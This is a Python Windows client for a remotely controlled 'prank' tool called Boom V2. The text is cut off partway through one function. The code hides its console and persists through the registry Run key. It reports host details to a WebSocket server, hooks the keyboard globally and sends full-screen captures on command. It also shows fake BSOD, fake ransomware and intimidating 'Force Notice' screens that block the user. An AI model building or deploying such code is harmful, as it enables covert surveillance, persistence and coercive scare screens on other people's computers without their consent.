#!/usr/bin/env python3
"""Boom V2 - prank/client script.

Connects to the Boom V2 server and executes prank commands (fake virus warnings,
BSOD simulation, fake ransomware screen, etc.) on the local machine.

Environment variables:
  BOOM_SERVER_URL   - WebSocket server URL (default: ws://127.0.0.1:18765/client)
  BOOM_AUTH_TOKEN   - Auth token matching the server (default: change-me)
"""
import os
import tkinter as tk
import random
import threading
import time
import sys
import webbrowser
import ctypes
import json
import platform
import socket
import winreg
import hmac
import hashlib
import io
import base64

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

try:
    import win32gui
    import win32api
    import win32con
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

try:
    import keyboard
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False

try:
    import mss
except ImportError:
    mss = None

try:
    from PIL import Image
except ImportError:
    Image = None

BACKGROUND_MODE = len(sys.argv) > 1 and sys.argv[1] == '--background'

if BACKGROUND_MODE:
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# Load unified configuration
if getattr(sys, 'frozen', False):
    config_dir = sys._MEIPASS
    CONFIG_PATH = os.path.join(config_dir, "temp_config.json")
else:
    config_dir = os.path.dirname(os.path.abspath(__file__))
    CONFIG_PATH = os.path.join(config_dir, "config.json")
try:
    with open(CONFIG_PATH, "r", encoding="utf-8") as f:
        config_data = json.load(f)
except FileNotFoundError:
    config_data = {"client": {}}

SERVER_URL = os.environ.get("BOOM_SERVER_URL", config_data.get("client", {}).get("server_url", "ws://127.0.0.1:18765/client"))
AUTH_TOKEN = os.environ.get("BOOM_AUTH_TOKEN", config_data.get("client", {}).get("token", "change-me"))
HMAC_SECRET = config_data.get("client", {}).get("hmac_secret", "change-me-hmac").encode()
RECONNECT_MIN = config_data.get("client", {}).get("reconnect_min_delay", 2)
RECONNECT_MAX = config_data.get("client", {}).get("reconnect_max_delay", 120)


def setup_auto_start():
    try:
        exe_path = f'"{sys.executable}" --background'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
        try:
            existing_value, _ = winreg.QueryValueEx(key, 'BoomServiceV2')
            winreg.CloseKey(key)
            if existing_value == exe_path:
                return True
        except FileNotFoundError:
            winreg.CloseKey(key)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'BoomServiceV2', 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

if BACKGROUND_MODE:
    setup_auto_start()


class BoomClient:
    def __init__(self, server_url=None, client_id=None, background=False):
        self.root = tk.Tk()
        self.root.withdraw()
        self.stage = 0
        self.windows = []
        self.debug_window = None
        self.stop_flag = False
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()
        self.background = background or BACKGROUND_MODE
        self.server_url = server_url or SERVER_URL
        self.client_id = client_id or f"boom_{os.getpid()}"
        self.ws = None
        self.auth_token = AUTH_TOKEN
        self.screen_flipped = False
        self.target_name = "Target"
        self.config = {
            "stage1_title": "系统警告",
            "stage1_text1": "警告：系统检测到病毒！",
            "stage1_text2": "您的计算机已被感染，正在删除系统文件...",
            "stage1_btn": "立即清理"
        }
        self.key_history = []
        self.click_history = []
        self.setup_keyboard_hook()
        self.root.bind_all("<Button-1>", self.on_bg_click)
        self.root.bind_all("<KeyPress-Tab>", self.on_tkinter_tab)
        self.root.bind_all("<KeyPress-Return>", self.on_tkinter_enter)
        if self.background:
            self.root.attributes('-toolwindow', True)
        # self.create_debug_window()  # Disabled to prevent popup on startup
        if WEBSOCKET_AVAILABLE:
            self.start_websocket()
        else:
            print("WebSocket client not available")
            self.root.quit()
            return
        self.root.mainloop()

    def get_all_monitors(self):
        """Return list of (x, y, width, height) for each monitor. Falls back to primary screen."""
        try:
            if WIN32_AVAILABLE:
                monitors = []
                for hdc, rect, flags in win32api.EnumDisplayMonitors():
                    left, top, right, bottom = rect
                    monitors.append((left, top, right - left, bottom - top))
                if monitors:
                    return monitors
        except Exception:
            pass
        return [(0, 0, self.screen_width, self.screen_height)]

    def create_monitor_window(self, x, y, w, h, bg_color):
        """Create a borderless, topmost Toplevel window covering (x,y)-(x+w,y+h)."""
        win = tk.Toplevel(self.root)
        win.overrideredirect(True)
        win.geometry(f"{w}x{h}+{x}+{y}")
        win.attributes('-topmost', True)
        win.configure(bg=bg_color)
        return win

    def capture_screenshot(self):
        """Capture the full screen, encode as base64 JPEG (quality=50, 50% size), send over WS."""
        try:
            if mss is None:
                self.ws.send(json.dumps({"type": "screenshot", "data": "", "error": "mss not available"}))
                return
            with mss.mss() as sct:
                monitor = sct.monitors[0]  # "All in one" virtual monitor
                screenshot = sct.grab(monitor)
            if Image is not None:
                img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                # Resize to 50% to keep payload under ~200 KB
                w, h = img.size
                img = img.resize((w // 2, h // 2), Image.LANCZOS)
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=50)
                b64_data = base64.b64encode(buf.getvalue()).decode()
            else:
                # Fallback: raw mss data (no PIL available)
                b64_data = base64.b64encode(screenshot.rgb).decode()
            self.ws.send(json.dumps({"type": "screenshot", "data": b64_data}))
        except Exception as e:
            try:
                self.ws.send(json.dumps({"type": "screenshot", "data": "", "error": str(e)}))
            except Exception:
                pass

    def create_debug_window(self):
        self.debug_window = tk.Toplevel(self.root)
        self.debug_window.title("Debug")
        dw = 260
        dh = 400
        dx = self.screen_width - dw - 10
        dy = 10
        self.debug_window.geometry(f"{dw}x{dh}+{dx}+{dy}")
        self.debug_window.attributes('-topmost', True)
        self.debug_window.attributes('-alpha', 0.95)
        self.debug_window.resizable(False, False)
        self.debug_label = tk.Label(self.debug_window, text="Stage: 0\nWaiting for connection...", font=("Arial", 9), fg="#0f0", bg="#333", justify=tk.LEFT, anchor="w")
        self.debug_label.pack(padx=5, pady=5, fill=tk.X)
        name_frame = tk.Frame(self.debug_window, bg="#333")
        name_frame.pack(fill=tk.X, padx=5, pady=5)
        tk.Label(name_frame, text="Target name:", font=("Arial", 9), fg="#aaa", bg="#333").pack(side=tk.LEFT)
        self.name_entry = tk.Entry(name_frame, width=10, font=("Arial", 9))
        self.name_entry.insert(0, self.target_name)
        self.name_entry.pack(side=tk.LEFT, padx=5)
        tk.Button(name_frame, text="Set", font=("Arial", 8), bg="#4caf50", fg="white", command=self.set_name).pack(side=tk.LEFT)
        tk.Button(self.debug_window, text="Stage 1", command=lambda: self.execute_command("stage_1"), bg="#ff7043", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="Stage 2", command=lambda: self.execute_command("stage_2"), bg="#ffa726", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="BSOD", command=lambda: self.execute_command("stage_3"), bg="#42a5f5", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="Ransom", command=lambda: self.execute_command("stage_4"), bg="#ab47bc", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="Force", command=lambda: self.execute_command("stage_force"), bg="#f44336", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="Move wnd", command=lambda: self.execute_command("prank_desktop"), bg="#66bb6a", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="Flip scr", command=lambda: self.execute_command("prank_flip_screen"), bg="#26c6da", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="Fake upd", command=lambda: self.execute_command("prank_fake_update"), bg="#78909c", fg="white").pack(fill=tk.X, padx=5, pady=2)
        tk.Button(self.debug_window, text="Close all", command=lambda: self.execute_command("exit"), bg="#ef5350", fg="white").pack(fill=tk.X, padx=5, pady=2)
        self._keep_debug_top()

    def set_name(self):
        self.target_name = self.name_entry.get().strip()
        if not self.target_name:
            self.target_name = "Target"
        self.root.after(0, self.update_debug, f"Stage: {self.stage}\nName: {self.target_name}\nWaiting for command")

    def _keep_debug_top(self):
        if self.debug_window and self.debug_window.winfo_exists():
            try:
                self.debug_window.attributes('-topmost', True)
                self.debug_window.lift()
            except:
                pass
        self.root.after(50, self._keep_debug_top)

    def setup_keyboard_hook(self):
        if KEYBOARD_AVAILABLE:
            try:
                keyboard.hook(self.on_global_key)
            except Exception as e:
                pass
        else:
            pass

    def on_global_key(self, event):
        if event.event_type != keyboard.KEY_DOWN:
            return

        current_time = time.time()
        key_name = event.name.lower() if event.name else ""

        self.key_history.append((key_name, current_time))
        self.key_history = [(k, t) for k, t in self.key_history if current_time - t <= 3.0]

        if self.stage > 0:
            # A. 键盘物理双击 Tab
            tabs = [t for k, t in self.key_history if k == 'tab']
            if len(tabs) >= 2 and tabs[-1] - tabs[-2] <= 1.0:
                self.key_history.clear()
                self.root.after(0, self.execute_command, "exit")
                return

            # B. 翻页笔 Tab 双击 (Tab + Enter 序列)
            last_keys = [k for k, _ in self.key_history]
            if len(last_keys) >= 2 and last_keys[-2:] == ['tab', 'enter']:
                self.key_history.clear()
                self.root.after(0, self.execute_command, "exit")
                return

            # C. 连续双击 Enter
            enters = [t for k, t in self.key_history if k == 'enter']
            if len(enters) >= 2 and enters[-1] - enters[-2] <= 1.0:
                self.key_history.clear()
                self.root.after(0, self.execute_command, "exit")
                return

        if len(self.key_history) >= 4:
            last_4 = self.key_history[-4:]
            keys = [k for k, _ in last_4]
            times = [t for _, t in last_4]
            if keys == ['page down', 'page up', 'page down', 'page up']:
                if times[-1] - times[0] <= 2.5:
                    self.key_history.clear()
                    self.root.after(0, self.execute_command, "stage_3")

    def on_bg_click(self, event):
        if self.stage <= 0:
            return

        current_time = time.time()
        if event.x_root >= self.screen_width - 100 and event.y_root >= self.screen_height - 100:
            self.click_history.append(current_time)
            self.click_history = [t for t in self.click_history if current_time - t <= 5.0]
            if len(self.click_history) >= 10:
                self.click_history.clear()
                self.execute_command("exit")

    def on_tkinter_tab(self, event):
        if self.stage <= 0:
            return

        current_time = time.time()
        self.key_history.append(('tab', current_time))
        self.key_history = [(k, t) for k, t in self.key_history if current_time - t <= 3.0]

        tabs = [t for k, t in self.key_history if k == 'tab']
        if len(tabs) >= 2 and tabs[-1] - tabs[-2] <= 1.0:
            self.key_history.clear()
            self.execute_command("exit")
            return

    def on_tkinter_enter(self, event):
        if self.stage <= 0:
            return

        current_time = time.time()
        self.key_history.append(('enter', current_time))
        self.key_history = [(k, t) for k, t in self.key_history if current_time - t <= 3.0]

        last_keys = [k for k, _ in self.key_history]
        if len(last_keys) >= 2 and last_keys[-2:] == ['tab', 'enter']:
            self.key_history.clear()
            self.execute_command("exit")
            return

        enters = [t for k, t in self.key_history if k == 'enter']
        if len(enters) >= 2 and enters[-1] - enters[-2] <= 1.0:
            self.key_history.clear()
            self.execute_command("exit")
            return

    def update_debug(self, text):
        if self.debug_label:
            self.debug_label.config(text=text)

    def get_client_info(self):
        system = platform.system()
        release = platform.release()
        version = platform.version()
        system_info = f"{system} {release} ({version})"
        hostname = "Unknown"
        try:
            hostname = socket.gethostname()
        except:
            pass
        try:
            import time as t
            timezone = t.tzname
        except:
            timezone = "Unknown"
        ip_address = "Unknown"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("1.1.1.1", 80))
                ip_address = s.getsockname()[0]
            except:
                pass
            finally:
                s.close()
            if ip_address == "Unknown":
                ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "Unknown"
        return {
            "system": system_info,
            "platform": platform.platform(),
            "hostname": hostname,
            "timezone": str(timezone),
            "local_ip": ip_address,
            "ip": ip_address,
            "screen": f"{self.screen_width}x{self.screen_height}",
            "pid": os.getpid(),
            "python": sys.version.split()[0],
            "background": self.background,
            "stage": self.stage,
            "client_version": "boom-v3.0"
        }

    def start_websocket(self):
        def run_ws():
            retry_delay = RECONNECT_MIN
            while True:
                try:
                    self.ws = websocket.WebSocketApp(
                        self.server_url,
                        on_message=self.on_ws_message,
                        on_error=self.on_ws_error,
                        on_close=self.on_ws_close,
                        on_open=self.on_ws_open
                    )
                    self.ws.run_forever()
                    # If run_forever returned cleanly, reset retry delay
                    retry_delay = RECONNECT_MIN
                except Exception as e:
                    print(f"WebSocket error: {e}")
                
                print(f"Disconnected. Reconnecting in {retry_delay}s...")
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 2, RECONNECT_MAX)

        threading.Thread(target=run_ws, daemon=True).start()

    def prank_rickroll(self):
        self.root.after(0, self.update_debug, "Stage: Extra\nRickroll")
        # Attempt to max volume on Windows
        if WIN32_AVAILABLE:
            try:
                # VK_VOLUME_UP = 0xAF, simulate pressing it 50 times
                for _ in range(50):
                    win32api.keybd_event(0xAF, 0, 0, 0)
                    win32api.keybd_event(0xAF, 0, win32con.KEYEVENTF_KEYUP, 0)
            except:
                pass
        
        # Open Rickroll in default browser
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", new=2)

    def prank_fake_notify(self):
        self.root.after(0, self.update_debug, "Stage: Extra\nFake Notify")
        
        # Create a borderless window mimicking a Windows 10/11 notification
        notify = tk.Toplevel(self.root)
        nw, nh = 360, 100
        nx = self.screen_width - nw - 20
        ny = self.screen_height - nh - 60
        
        notify.geometry(f"{nw}x{nh}+{nx}+{ny}")
        notify.overrideredirect(True)
        notify.attributes('-topmost', True)
        notify.config(bg="#1f1f1f")
        
        # Notifications list
        messages = [
            ("System Alert", "Your location has been shared with 12 contacts."),
            ("Security Center", "Root administrator has connected remotely."),
            ("OneDrive", "Uploading screenshot (1/1) to public folder..."),
            ("Battery Warning", "Battery level critical (2%). Shutting down soon.")
        ]
        title, text = random.choice(messages)
        
        tk.Label(notify, text=title, font=("Segoe UI", 12, "bold"), fg="white", bg="#1f1f1f", anchor="w").place(x=15, y=10)
        tk.Label(notify, text=text, font=("Segoe UI", 10), fg="#cccccc", bg="#1f1f1f", anchor="w", wraplength=330).place(x=15, y=40)
        
        def slide_in():
            for i in range(20, -1, -2):
                if not notify.winfo_exists(): return
                notify.geometry(f"{nw}x{nh}+{nx}+{ny + (i * 5)}")
                notify.update()
                time.sleep(0.01)
                
        def close_notify():
            try: notify.destroy()
            except: pass
            
        notify.after(10, slide_in)
        notify.after(5000, close_notify)
        self.windows.append(notify)

    def on_ws_open(self, ws):
        client_info = self.get_client_info()
        ws.send(json.dumps({
            "type": "register",
            "client_id": self.client_id,
            "token": self.auth_token,
            "client_info": client_info,
            "system": client_info["system"],
            "timezone": client_info["timezone"],
            "ip": client_info["ip"]
        }))
        self.root.after(10000, self.send_heartbeat)
        self.root.after(0, self.update_debug, f"Stage: {self.stage}\nConnected\nID: {self.client_id}\nName: {self.target_name}")

    def send_heartbeat(self):
        try:
            if self.ws:
                self.ws.send(json.dumps({
                    "type": "heartbeat",
                    "stage": self.stage,
                    "screen": f"{self.screen_width}x{self.screen_height}",
                    "background": self.background
                }))
        except Exception:
            pass
        self.root.after(10000, self.send_heartbeat)

    def on_ws_message(self, ws, message):
        try:
            data = json.loads(message)
            msg_type = data.get("type")
            if msg_type == "control":
                # Verify HMAC signature
                received_signature = data.get("signature")
                if not received_signature:
                    print("Dropping command: missing signature")
                    return
                    
                # Reconstruct payload without signature to verify
                payload_dict = {
                    "type": "control",
                    "command": data.get("command"),
                    "config": data.get("config"),
                    "timestamp": data.get("timestamp")
                }
                payload_str = json.dumps(payload_dict, sort_keys=True)
                expected_signature = hmac.new(HMAC_SECRET, payload_str.encode(), hashlib.sha256).hexdigest()
                
                if not hmac.compare_digest(expected_signature, received_signature):
                    print("Dropping command: invalid signature")
                    return

                command = data.get("command")
                config_data = data.get("config")
                if config_data:
                    self.config.update(config_data)
                    target = config_data.get("target_name")
                    if target:
                        self.target_name = target
                        self.root.after(0, lambda: self.name_entry.delete(0, tk.END))
                        self.root.after(0, lambda: self.name_entry.insert(0, self.target_name))
                self.root.after(0, self.execute_command, command)
            elif msg_type == "welcome":
                print(f"Welcome: {data.get('message')}")
        except Exception as e:
            print(f"Message error: {e}")

    def on_ws_error(self, ws, error):
        print(f"WebSocket error: {error}")

    def on_ws_close(self, ws, close_status_code, close_msg):
        print(f"Connection closed: {close_status_code}")

    def execute_command(self, command):
        if not command:
            return
        
        # Mapping commands to functions
        cmd_map = {
            "stage_1": self.start_stage_1,
            "stage_2": self.start_stage_2,
            "stage_3": self.start_stage_3,
            "stage_4": self.start_stage_4,
            "stage_force": self.start_stage_force,
            "prank_desktop": self.prank_desktop,
            "prank_flip_screen": self.prank_flip_screen,
            "prank_fake_update": self.prank_fake_update,
            "prank_glitch": self.prank_glitch,
            "prank_infinite_window": self.prank_infinite_window,
            "prank_ghost_typing": self.prank_ghost_typing,
            "prank_rickroll": self.prank_rickroll,
            "prank_fake_notify": self.prank_fake_notify,
            "screenshot": self.capture_screenshot,
            "exit": self.stop_prank,
        }
        
        if command in cmd_map:
            cmd_map[command]()
        elif command:
            print(f"Unknown command: {command}")
        
        if command == "exit":
            self.root.after(100, self.update_debug, f"Stage: 0\nWindows cleared\nName: {self.target_name}\nWaiting for command")

    def close_all_windows(self):
        self.stop_flag = True   # Signal background threads first
        for win in self.windows:
            try:
                if win.winfo_exists():
                    win.destroy()
            except:
                pass
        self.windows = []
        self.stop_flag = False  # Reset after windows cleaned up

    def stop_prank(self):
        self.close_all_windows()
        if self.screen_flipped:
            self.screen_flipped = False
            self.prank_flip_screen()
        self.stage = 0

    def start_stage_1(self):
        self.close_all_windows()
        self.stage = 1
        self.root.after(0, self.update_debug, f"Stage: 1\nSingle warning window\nName: {self.target_name}")
        win = tk.Toplevel(self.root)
        win.title(self.config["stage1_title"])
        w, h = 450, 250
        x = random.randint(100, self.screen_width - w - 100)
        y = random.randint(100, self.screen_height - h - 100)
        win.geometry(f"{w}x{h}+{x}+{y}")
        win.attributes('-topmost', True)
        win.resizable(False, False)
        header = tk.Frame(win, bg="#d32f2f", height=50)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        tk.Label(header, text="⚠ " + self.config["stage1_title"], font=("Arial", 16, "bold"), fg="white", bg="#d32f2f").pack(pady=10)
        body = tk.Frame(win, bg="white")
        body.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        tk.Label(body, text=self.config["stage1_text1"], font=("Arial", 12, "bold"), fg="red", bg="white").pack(pady=5)
        tk.Label(body, text=self.config["stage1_text2"], font=("Arial", 10), fg="#333", bg="white").pack(pady=5)
        tk.Label(body, text="[!] Recommended action now!", font=("Arial", 9), fg="#ff9800", bg="white").pack(pady=5)
        btn_frame = tk.Frame(win, bg="#f5f5f5")
        btn_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Button(btn_frame, text=self.config["stage1_btn"], font=("Arial", 11, "bold"), bg="#d32f2f", fg="white", command=win.destroy).pack(fill=tk.X, pady=5)
        self.windows.append(win)

    def start_stage_2(self):
        self.close_all_windows()
        self.stage = 2
        self.root.after(0, self.update_debug, f"Stage: 2\n20 warning windows\nName: {self.target_name}")
        for i in range(20):
            if self.stop_flag:
                return
            win = tk.Toplevel(self.root)
            win.title(self.config["stage1_title"] + f" #{i+1}")
            w, h = 400, 200
            x = random.randint(50, self.screen_width - w - 50)
            y = random.randint(50, self.screen_height - h - 50)
            win.geometry(f"{w}x{h}+{x}+{y}")
            win.attributes('-topmost', True)
            win.resizable(False, False)
            header = tk.Frame(win, bg="#d32f2f", height=40)
            header.pack(fill=tk.X)
            header.pack_propagate(False)
            tk.Label(header, text=f"⚠ Warning #{i+1}", font=("Arial", 12, "bold"), fg="white", bg="#d32f2f").pack(pady=8)
            body = tk.Frame(win, bg="white")
            body.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
            tk.Label(body, text=self.config["stage1_text1"], font=("Arial", 11, "bold"), fg="red", bg="white").pack(pady=3)
            tk.Label(body, text=self.config["stage1_text2"], font=("Arial", 9), fg="#333", bg="white").pack(pady=3)
            tk.Button(body, text=self.config["stage1_btn"], font=("Arial", 10), bg="#d32f2f", fg="white", command=win.destroy).pack(pady=5)
            self.windows.append(win)
            for _ in range(3):
                if self.stop_flag:
                    return
                time.sleep(0.05)

    def start_stage_3(self):
        self.close_all_windows()
        self.stage = 3
        self.root.after(0, self.update_debug, f"Stage: 3\nBSOD simulation")
        monitors = self.get_all_monitors()
        self.progress_var = tk.StringVar()
        self.progress_var.set("0% complete")
        for mx, my, mw, mh in monitors:
            bsod = self.create_monitor_window(mx, my, mw, mh, "#0078d7")
            bsod.protocol("WM_DELETE_WINDOW", lambda: None)
            frame = tk.Frame(bsod, bg="#0078d7")
            frame.pack(fill=tk.BOTH, expand=True)
            tk.Label(frame, text=":(", font=("Segoe UI", 80), fg="white", bg="#0078d7", anchor="w").place(x=50, y=80)
            tk.Label(frame, text="Your PC ran into a problem and needs to restart.", font=("Segoe UI", 18), fg="white", bg="#0078d7", anchor="w").place(x=50, y=220)
            tk.Label(frame, text="We're just collecting some error info, then we'll restart for you.", font=("Segoe UI", 14), fg="white", bg="#0078d7", anchor="w").place(x=50, y=260)
            tk.Label(frame, textvariable=self.progress_var, font=("Segoe UI", 14), fg="white", bg="#0078d7", anchor="w").place(x=50, y=310)
            tk.Label(frame, text="For more information about this issue:", font=("Segoe UI", 12), fg="white", bg="#0078d7", anchor="w").place(x=50, y=400)
            tk.Label(frame, text="windows.com/stopcode", font=("Segoe UI", 12, "underline"), fg="white", bg="#0078d7", anchor="w").place(x=50, y=425)
            tk.Label(frame, text="Stop code: SYSTEM_SERVICE_EXCEPTION", font=("Segoe UI", 12), fg="white", bg="#0078d7", anchor="w").place(x=50, y=470)
            def keep_top(w=bsod):
                try:
                    w.attributes('-topmost', True)
                    w.lift()
                    w.after(100, keep_top)
                except tk.TclError:
                    pass
            keep_top()
            self.windows.append(bsod)
        def update_progress():
            i = 0
            while i < 101 and not self.stop_flag:
                step = random.randint(1, 2)
                i += step
                self.progress_var.set(f"{min(i, 100)}% complete")
                time.sleep(0.15)
        threading.Thread(target=update_progress, daemon=True).start()

    def start_stage_4(self):
        self.close_all_windows()
        self.stage = 4
        self.root.after(0, self.update_debug, f"Stage: 4\nFake ransomware screen")
        monitors = self.get_all_monitors()
        countdown_var = tk.StringVar()
        countdown_var.set("Time remaining: 47:59:59")
        for mx, my, mw, mh in monitors:
            wc = self.create_monitor_window(mx, my, mw, mh, "#1a0000")
            wc.protocol("WM_DELETE_WINDOW", lambda: None)
            frame = tk.Frame(wc, bg="#1a0000")
            frame.pack(fill=tk.BOTH, expand=True)
            tk.Label(frame, text="🔒", font=("Arial", 80), fg="#d32f2f", bg="#1a0000").place(x=100, y=60)
            tk.Label(frame, text="Oops, your files have been encrypted!", font=("Arial", 24, "bold"), fg="#d32f2f", bg="#1a0000").place(x=100, y=180)
            tk.Label(frame, text="Your files have been encrypted. Pay 0.5 BTC to recover.", font=("Arial", 14), fg="white", bg="#1a0000").place(x=100, y=240)
            tk.Label(frame, text="Payment must be made within 48 hours.", font=("Arial", 12), fg="#ff9800", bg="#1a0000").place(x=100, y=280)
            tk.Label(frame, textvariable=countdown_var, font=("Arial", 18, "bold"), fg="#f44336", bg="#1a0000").place(x=100, y=330)
            wallet_box = tk.LabelFrame(frame, text="Bitcoin Wallet Address", font=("Arial", 12), fg="white", bg="#1a0000")
            wallet_box.place(x=100, y=400, width=500, height=60)
            tk.Label(wallet_box, text="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", font=("Courier", 11), fg="#ffeb3b", bg="#1a0000").pack(pady=10)
            tk.Label(frame, text="Click 'I have paid' after payment", font=("Arial", 11), fg="#aaa", bg="#1a0000").place(x=100, y=490)
            tk.Button(frame, text="I have paid", font=("Arial", 12, "bold"), bg="#4caf50", fg="white", command=lambda: self.show_taunt()).place(x=100, y=530)
            tk.Button(frame, text="Decrypt sample", font=("Arial", 10), bg="#607d8b", fg="white", command=lambda: None).place(x=250, y=530)
            def keep_top(w=wc):
                try:
                    w.attributes('-topmost', True)
                    w.lift()
                    w.after(100, keep_top)
                except tk.TclError:
                    pass
            keep_top()
            self.windows.append(wc)
        def do_countdown(seconds=48*3600):
            for remaining in range(seconds, -1, -1):
                if self.stop_flag:
                    break
                h = remaining // 3600
                m = (remaining % 3600) // 60
                s = remaining % 60
                countdown_var.set(f"Time remaining: {h:02d}:{m:02d}:{s:02d}")
                time.sleep(1)
        threading.Thread(target=do_countdown, daemon=True).start()

    def show_taunt(self):
        taunt = tk.Toplevel(self.root)
        taunt.title("Payment Result")
        tw, th = 400, 200
        tx = self.screen_width//2 - tw//2
        ty = self.screen_height//2 - th//2
        taunt.geometry(f"{tw}x{th}+{tx}+{ty}")
        taunt.attributes('-topmost', True)
        taunt.resizable(False, False)
        tk.Label(taunt, text="😂 Just kidding! Payment does nothing!", font=("Arial", 16, "bold"), fg="red", bg="white").pack(pady=20)
        tk.Label(taunt, text="This is a prank — no files were actually encrypted.", font=("Arial", 14), fg="#333", bg="white").pack(pady=10)
        tk.Label(taunt, text="Your money is safe (this is just a simulation).", font=("Arial", 12), fg="#ff9800", bg="white").pack(pady=5)
        tk.Button(taunt, text="OK", font=("Arial", 11), bg="#d32f2f", fg="white", command=taunt.destroy).pack(pady=10)
        self.windows.append(taunt)

    def start_stage_force(self):
        self.close_all_windows()
        self.stage = 6
        self.root.after(0, self.update_debug, f"Stage: Force\nName: {self.target_name}")
        monitors = self.get_all_monitors()
        for mx, my, mw, mh in monitors:
            fw = self.create_monitor_window(mx, my, mw, mh, "#212121")
            fw.protocol("WM_DELETE_WINDOW", lambda: None)
            frame = tk.Frame(fw, bg="#212121")
            frame.pack(fill=tk.BOTH, expand=True)
            tk.Label(frame, text="⚠ Force Notice ⚠", font=("Arial", 28, "bold"), fg="#f44336", bg="#212121").place(x=mx + (mw - 400) // 2, y=80)
            tk.Label(frame, text=f"Target: {self.target_name}", font=("Arial", 20), fg="white", bg="#212121").place(x=mx + (mw - 300) // 2, y=180)
            tk.Label(frame, text=f"{self.target_name}, stop using the computer now.", font=("Arial", 18), fg="#ff9800", bg="#212121").place(x=mx + (mw - 400) // 2, y=260)
            tk.Label(frame, text="Forced action will be taken immediately.", font=("Arial", 18), fg="#ff9800", bg="#212121").place(x=mx + (mw - 400) // 2, y=300)
            tk.Label(frame, text="Please shut down and cooperate.", font=("Arial", 14), fg="#aaa", bg="#212121").place(x=mx + (mw - 360) // 2, y=380)
            def keep_top(w=fw):
                try:
                    w.attributes('-topmost', True)
                    w.lift()
                    w.after(100, keep_top)
                except tk.TclError:
                    pass
            keep_top()
            self.windows.append(fw)

    def prank_desktop(self):
        self.root.after(0, self.update_debug, f"Stage: Extra\nMove windows prank")
        if not WIN32_AVAILABLE:
            self.root.after(0, self.update_debug, f"Stage: Extra\npywin32 not installed, skipped")
            return
        try:
            desktop_windows = []
            def callback(hwnd, _):
                if win32gui.IsWindowVisible(hwnd):
                    desktop_windows.append(hwnd)
                return True
            win32gui.EnumWindows(callback, None)
            for hwnd in desktop_windows:
                try:
                    rect = win32gui.GetWindowRect(hwnd)
                    new_x = random.randint(0, self.screen_width - (rect[2]-rect[0]))
                    new_y = random.randint(0, self.screen_height - (rect[3]-rect[1]))
                    win32gui.MoveWindow(hwnd, new_x, new_y, rect[2]-rect[0], rect[3]-rect[1], True)
                except:
                    pass
        except Exception as e:
            print(f"Move windows failed: {e}")

    def prank_flip_screen(self):
        self.root.after(0, self.update_debug, f"Stage: Extra\nFlip screen")
        if not WIN32_AVAILABLE:
            self.root.after(0, self.update_debug, f"Stage: Extra\npywin32 not installed, skipped")
            return
        try:
            device = win32api.EnumDisplayDevices(None, 0)
            dm = win32api.EnumDisplaySettings(device.DeviceName, -1)
            dm.DisplayOrientation = (dm.DisplayOrientation + 1) % 4
            dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
            win32api.ChangeDisplaySettingsEx(device.DeviceName, dm, 0)
            self.screen_flipped = not self.screen_flipped
        except Exception as e:
            print(f"Flip screen failed: {e}")

    def prank_fake_update(self):
        self.close_all_windows()
        self.stage = 5
        self.root.after(0, self.update_debug, f"Stage: Extra\nFake Windows Update")
        monitors = self.get_all_monitors()
        progress_var = tk.StringVar()
        progress_var.set("0%")
        for mx, my, mw, mh in monitors:
            fu = self.create_monitor_window(mx, my, mw, mh, "#005a9e")
            frame = tk.Frame(fu, bg="#005a9e")
            frame.pack(fill=tk.BOTH, expand=True)
            tk.Label(frame, text="Updating Windows", font=("Segoe UI", 32), fg="white", bg="#005a9e").place(x=50, y=100)
            tk.Label(frame, text="Don't turn off your computer.", font=("Segoe UI", 20), fg="white", bg="#005a9e").place(x=50, y=160)
            tk.Label(frame, textvariable=progress_var, font=("Segoe UI", 18), fg="white", bg="#005a9e").place(x=50, y=220)
            tk.Label(frame, text="Configuring updates... This may take a few minutes.", font=("Segoe UI", 14), fg="white", bg="#005a9e").place(x=50, y=270)
            def keep_top(w=fu):
                try:
                    w.attributes('-topmost', True)
                    w.lift()
                    w.after(100, keep_top)
                except tk.TclError:
                    pass
            keep_top()
            self.windows.append(fu)
        def fake_progress():
            percent = 0
            while not self.stop_flag:
                percent += random.randint(-5, 10)
                percent = max(0, min(percent, 99))
                progress_var.set(f"{percent}%")
                time.sleep(0.3)
        threading.Thread(target=fake_progress, daemon=True).start()

    def prank_glitch(self):
        self.close_all_windows()
        self.stage = 8
        self.root.after(0, self.update_debug, f"Stage: Extra\nGlitch Overlay")
        monitors = self.get_all_monitors()
        glitch_windows = []
